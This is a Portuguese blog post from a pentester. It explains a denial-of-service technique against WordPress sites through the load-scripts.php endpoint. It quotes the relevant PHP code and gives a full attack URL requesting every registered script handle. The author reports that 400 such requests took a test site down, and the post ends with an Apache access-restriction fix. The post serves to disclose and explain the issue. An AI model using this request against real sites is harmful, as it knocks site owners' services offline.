---
layout: posts
title: Ataques DOS em sites WordPress
data: Julho de 2018
background: /files/images/articles/2018/2018-07-06-Ataques-DOS-em-sites-WordPress/banner.png
description: Analisando vulnerabilidades em sites com WordPress
tags: [Segurança, Wordpress]
categories: 
  - Pentest
---
Segundo informações da `WordPress`, hoje eles têm por volta de 29% dos sites que existem na internet, o que é um grande número se pesarmos no valor total de sites existentes.

E infelizmente, vulnerabilidades do tipo `Zero Day`, agrega à todos esses 29%, podendo assim trazer problemas para empresas que dependem do seu site, para garantir o seu lucro.

Hoje vou explicar, um pequeno método de ataque DoS, que eu identifiquei analisando vulnerabilidades de um site em WordPress, de um freelancer que estou fazendo.

> Lembrando que para explorar vulnerabilidades sem permissão do proprietário é crime.

Usando o `WPscan` que é uma ferramenta de análise de vulnerabilidades, identifique uma URL, que me chamou bastante atenção, onde o pesquisador informou um possível método de ataque [DoS](http://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)

```bash
https://LOCALHOST/wp-admin/load-scripts.php?c=1&load%5B%5D=jquery-ui-core&ver=4.9.1
```

Analisando todos os arquivos do WP vi que o arquivo `load-scripts.php`, recebe um parâmetro chamados load[], sendo esse valor `jquery-ui-core&ver=4.9.1`, e quando faço a requisição dessa página tenho o retorno do script em questão.

![Load Script](/files/images/articles/2018/2018-07-06-Ataques-DOS-em-sites-WordPress/1530882777338.png)

O que podemos perceber com essa URL é que provavelmente foi feita para fornecer à usuários alguns módulos JS, além de que o parâmetro `load[]` se trata de uma matriz, o que significa que podemos colocar vários valores de uma vez só.

Como o WordPress é uma ferramenta opensource, não é difícil ter acesso à todos os seus arquivos de Background, tornando fácil a analise desses arquivos. Com isso descobri que o arquivo foi criado para minimizar a quantidade de requisições enviadas por clientes, ao tentar carregar arquivos como JS e CSS, então quando ele precisa carregar diversos arquivos, ele faz isso em uma única requisição usando o arquivo `load-scripts.php`.

Explorando um pouco mais o arquivo encontrei uma parte do código que existe uma lista bem definida ($wp_scripts), que pode ser solicitada pelos usuários como parte do parâmetro `load []` . Se o valor solicitado existir, o servidor executará uma ação de leitura de E/S para um caminho bem definido associado ao valor fornecido pelo usuário.

````php
foreach ( $load as $handle ) {
	if ( ! array_key_exists( $handle, $wp_scripts->registered ) ) {
		continue;
	}
	$path = ABSPATH . $wp_scripts->registered[ $handle ]->src;
	$out .= get_file( $path ) . "\n";
}
````

Os scripts fica no arquivo [script-loader.php](https://github.com/WordPress/WordPress/blob/master/wp-includes/script-loader.php)

Existem muitos arquivos que o script-loadre.php utiliza, alguns deles são:

````txt
eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
````

Então coloquei todos esses arquivos dentro da matriz, e fiz a requisição de todos eles de uma única só vez, o que me resultou em quase `5M` e uma demora de `2 minutos`

````
http://LOCALHOST/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9'
````

Com toda essa demora e tamanha requisição, é fácil criar um script para fazer diversas requisições, para derrubar o site, então fazendo alguns testes, com apenas 400 requisições, derrubei o site.

![1530884365338](/files/images/articles/2018/2018-07-06-Ataques-DOS-em-sites-WordPress/1530884365338.png)

Bom aparentemente não é uma vulnerabilidade do Wordpress, e sim de configuração do servidor, então para corrigir, basta você negar acesso á usuário `anônimo` e liberar apenas para autenticados em seu servidor apache.

\flw
